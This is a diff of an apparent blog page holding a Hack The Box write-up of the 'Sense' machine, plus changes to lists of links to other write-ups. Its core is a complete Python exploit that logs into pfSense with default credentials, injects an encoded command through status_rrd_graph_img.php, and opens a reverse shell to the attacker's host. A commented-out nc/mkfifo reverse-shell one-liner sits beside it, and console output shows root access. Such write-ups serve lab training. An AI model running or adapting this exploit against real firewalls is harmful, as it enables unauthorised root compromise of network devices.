-                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-            <span class="n">p3</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;OK&#34;</span><span class="p">)</span>
-
-    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
-
-    <span class="k">finally</span><span class="p">:</span>
-        <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
-            <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
-        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Web thread exited successfully.&#34;</span><span class="p">)</span>
-
-<span class="k">try</span><span class="p">:</span>
-    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_ptyshell_payload</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
-<span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
-<span class="n">ptyshell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
-<span class="k">if</span> <span class="n">ptyshell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
-    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
-    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
-<span class="n">ptyshell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="ch">#!/usr/bin/env python2</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># Author: Alamot (Antonios Tsolis)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">re</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">sys</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">time</span>
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">signal</span><span class="o">,</span> <span class="nn">thread</span>
+</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span><span class="o">,</span> <span class="nn">urllib3</span>
+</span></span><span class="line"><span class="cl"><span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIG_DFL</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">DEBUG</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl"><span class="n">RHOST</span><span class="o">=</span><span class="s2">&#34;10.10.10.60&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">RPORT</span><span class="o">=</span><span class="mi">443</span>
+</span></span><span class="line"><span class="cl"><span class="n">LHOST</span><span class="o">=</span><span class="s2">&#34;10.10.15.128&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="n">LPORT</span><span class="o">=</span><span class="mi">60001</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">DEBUG</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;info&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">send_ptyshell_payload</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1"># This payload works too</span>
+</span></span><span class="line"><span class="cl">    <span class="c1"># stager = &#34;rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2&gt;&amp;1 | nc &#34; + str(LHOST) + &#34; &#34; + str(LPORT) + &#34; &gt; /tmp/f&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">stager</span> <span class="o">=</span> <span class="s2">&#34;python -c </span><span class="se">\&#34;</span><span class="s2">import os, pty, socket; lhost = &#39;&#34;</span><span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LHOST</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;&#39;; lport = &#34;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">LPORT</span><span class="p">)</span> <span class="o">+</span> <span class="s2">&#34;; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((lhost, lport)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); os.putenv(&#39;HISTFILE&#39;,&#39;/dev/null&#39;); pty.spawn(&#39;/bin/sh&#39;); s.close(); exit()</span><span class="se">\&#34;</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">encoded_stager</span> <span class="o">=</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">stager</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">encoded_stager</span> <span class="o">+=</span> <span class="s2">&#34;</span><span class="se">\\\\</span><span class="si">%03d</span><span class="s2">&#34;</span> <span class="o">%</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="nb">oct</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">c</span><span class="p">))))</span>
+</span></span><span class="line"><span class="cl">    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">client</span> <span class="o">=</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">urllib3</span><span class="o">.</span><span class="n">disable_warnings</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">session</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">verify</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">        <span class="n">client</span><span class="o">.</span><span class="n">keep_alive</span> <span class="o">=</span> <span class="kc">False</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Retrieve the CSRF token first</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p1</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Connecting to get csrf token&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">),</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p1</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">csrf</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="s1">&#39;csrfMagicToken\s*=\s*&#34;(sid:\w+,\d+)&#39;</span><span class="p">,</span> <span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">)</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p1</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;csrfMagicToken = &#34;</span> <span class="o">+</span> <span class="n">csrf</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Login</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p2</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Logging in&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="n">data</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;__csrf_magic&#34;</span><span class="p">:</span><span class="n">csrf</span><span class="p">,</span> <span class="s2">&#34;usernamefld&#34;</span><span class="p">:</span><span class="s2">&#34;rohit&#34;</span><span class="p">,</span> <span class="s2">&#34;passwordfld&#34;</span><span class="p">:</span><span class="s2">&#34;pfsense&#34;</span><span class="p">,</span> <span class="s2">&#34;login&#34;</span><span class="p">:</span><span class="s2">&#34;Login&#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/index.php&#34;</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p1</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p2</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="c1"># Send payload</span>
+</span></span><span class="line"><span class="cl">        <span class="n">p3</span><span class="o">=</span><span class="n">log</span><span class="o">.</span><span class="n">progress</span><span class="p">(</span><span class="s2">&#34;Sending pty shell payload...&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">params</span><span class="o">=</span><span class="p">{</span><span class="s2">&#34;database&#34;</span><span class="p">:</span><span class="s2">&#34;-throughput.rrd&#34;</span><span class="p">,</span> <span class="s2">&#34;graph&#34;</span><span class="p">:</span><span class="s2">&#34;file|printf &#34;</span><span class="o">+</span><span class="n">encoded_stager</span><span class="o">+</span><span class="s2">&#34;|sh|echo &#34;</span><span class="p">}</span>
+</span></span><span class="line"><span class="cl">            <span class="n">response</span> <span class="o">=</span> <span class="n">client</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;https://&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RHOST</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;:&#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">RPORT</span><span class="p">)</span><span class="o">+</span><span class="s2">&#34;/status_rrd_graph_img.php&#34;</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">!=</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">                <span class="n">p3</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Status &#34;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">                <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">Timeout</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">p3</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;OK&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="n">requests</span><span class="o">.</span><span class="n">exceptions</span><span class="o">.</span><span class="n">RequestException</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">finally</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">client</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="n">client</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">        <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s2">&#34;Web thread exited successfully.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">threading</span><span class="o">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">send_ptyshell_payload</span><span class="p">)</span><span class="o">.</span><span class="n">start</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">error</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">e</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl"><span class="n">ptyshell</span> <span class="o">=</span> <span class="n">listen</span><span class="p">(</span><span class="n">LPORT</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span><span class="o">.</span><span class="n">wait_for_connection</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="n">ptyshell</span><span class="o">.</span><span class="n">sock</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="n">log</span><span class="o">.</span><span class="n">failure</span><span class="p">(</span><span class="s2">&#34;Connection timeout.&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">ptyshell</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl"><span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span></span></span></code></pre></div></p>
 
 <p>Let&rsquo;s run it:
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>./autopwn_sense.py
-<span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
-</span><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.60 on port 49022
-</span><span class="go">[+] Connecting to get csrf token: csrfMagicToken = sid:5fcb86e278c2e4cb6b5aa5b4346218a9fb4d1647,1521716176
-</span><span class="go">[+] Logging in: Status 200
-</span><span class="go">[+] Sending pty shell payload...: OK
-</span><span class="go">[*] Switching to interactive mode
-</span><span class="go"></span><span class="gp"># </span>$ whoami
-<span class="go">root
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ./autopwn_sense.py
+</span></span><span class="line"><span class="cl"><span class="go">[+] Trying to bind to 0.0.0.0 on port 60001: Done
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Waiting for connections on 0.0.0.0:60001: Got connection from 10.10.10.60 on port 49022
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Connecting to get csrf token: csrfMagicToken = sid:5fcb86e278c2e4cb6b5aa5b4346218a9fb4d1647,1521716176
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Logging in: Status 200
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Sending pty shell payload...: OK
+</span></span></span><span class="line"><span class="cl"><span class="go">[*] Switching to interactive mode
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="gp">#</span> $ whoami
+</span></span><span class="line"><span class="cl"><span class="go">root
+</span></span></span></code></pre></div></div></p>
 
         </div>
 
@@ -563,6 +563,26 @@ Password: pfsense</code></pre></div></p>
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
           
            
            
@@ -588,16 +608,16 @@ Password: pfsense</code></pre></div></p>
            
            
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Reddish write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">26 Jan 2019</time>
-      <time lang="el">26 Ιαν 2019</time>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
     </footer>
   </a>
 </article>
@@ -638,6 +658,26 @@ Password: pfsense</code></pre></div></p>
           
            
            
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -674,162 +714,6 @@ Password: pfsense</code></pre></div></p>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fulcrum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">09 Jun 2018</time>
-      <time lang="el">09 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Falafel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Jun 2018</time>
-      <time lang="el">23 Ιουν 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Fortune write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">02 Aug 2019</time>
-      <time lang="el">02 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -886,230 +770,6 @@ Password: pfsense</code></pre></div></p>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Node write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Node</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 Mar 2018</time>
-      <time lang="el">03 Μαρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Minion write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">10 Apr 2018</time>
-      <time lang="el">10 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Optimum write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">28 Oct 2017</time>
-      <time lang="el">28 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Tally write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">03 May 2018</time>
-      <time lang="el">03 Μαϊ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1191,82 +851,6 @@ Password: pfsense</code></pre></div></p>
            
            
            
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Legacy write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">19 Oct 2017</time>
-      <time lang="el">19 Οκτ 2017</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
             <article class="li col-sm-6 col-md-4">
   <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
     <div class="cell">
@@ -1282,6 +866,474 @@ Password: pfsense</code></pre></div></p>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
